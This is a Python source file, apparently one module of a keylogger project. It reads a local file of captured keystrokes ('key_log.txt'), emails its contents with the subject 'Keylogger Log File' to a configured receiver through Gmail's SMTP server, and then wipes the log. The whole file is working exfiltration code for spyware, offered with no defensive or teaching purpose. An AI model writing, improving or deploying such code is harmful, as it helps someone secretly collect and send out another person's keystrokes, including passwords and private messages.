import smtplib 
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart 
import os


smtp_server = "smtp.gmail.com"

def send_email(): 
    #set up STMP server and send email
    try: 
        
        sender_email = os.environ.get("SENDER_EMAIL")
        email_password = os.environ.get("EMAIL_PASSWORD")
        receiver_email = os.environ.get("RECEIVER_EMAIL")

        if not sender_email or not email_password or not receiver_email:
            raise ValueError("Missing email credentials. Set SENDER_EMAIL, EMAIL_PASSWORD, and RECEIVER_EMAIL as environment variables.")

        
        #read the log file 
        
        if not os.path.exists("key_log.txt"):
            print ("Log file not found, skipping email.")
            return
        
        with open("key_log.txt", "r") as file: 
            log_content = file.read() 
            
        #check if there's content to send
        if not log_content.strip(): 
            print("Log file is empty, skipping email.")
            return
    
    
        #create email
        msg = MIMEMultipart()
        msg["From"] = sender_email
        msg["To"] = receiver_email
        msg["Subject"] = "Keylogger Log File"
        msg.attach(MIMEText(log_content, "plain"))

        #attach content to email
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server: 
            server.login(sender_email, email_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
            
        #clear the log after sending    
        with open("key_log.txt", "w") as file: 
            file.write("")
                
        print("Email sent successfully")
    
    except ValueError as ve: 
        print(f"Configuration Error: {ve}")
        
    except smtplib.SMTPAuthenticationError: 
        print(" SMTP authentication failed. Check your email credentials.")
        
